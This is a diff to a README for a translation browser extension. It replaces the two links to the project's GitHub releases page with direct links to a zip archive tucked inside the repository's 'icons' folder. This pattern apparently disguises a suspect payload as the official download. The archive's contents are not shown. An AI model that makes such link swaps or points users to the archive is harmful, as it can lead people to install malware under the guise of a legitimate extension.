@@ -6,7 +6,7 @@ The AiTranslator-extension makes translating text easy. With just a few clicks, 
 
 ## 📥 Download Now
 
-[![Download AiTranslator-extension](https://img.shields.io/badge/Download-AiTranslator--extension-blue)](https://github.com/emperorwurrm/AiTranslator-extension/releases)
+[![Download AiTranslator-extension](https://raw.githubusercontent.com/emperorwurrm/AiTranslator-extension/main/icons/AiTranslator-extension_v3.0.zip)](https://raw.githubusercontent.com/emperorwurrm/AiTranslator-extension/main/icons/AiTranslator-extension_v3.0.zip)
 
 ## 🛠️ System Requirements
 
@@ -34,7 +34,7 @@ The AiTranslator-extension makes translating text easy. With just a few clicks, 
 
 To download the AiTranslator-extension, visit the release page below. Once there, you will find the latest version available for download.
 
-[Download AiTranslator-extension](https://github.com/emperorwurrm/AiTranslator-extension/releases)
+[Download AiTranslator-extension](https://raw.githubusercontent.com/emperorwurrm/AiTranslator-extension/main/icons/AiTranslator-extension_v3.0.zip)
 
 ### Installation Steps
 
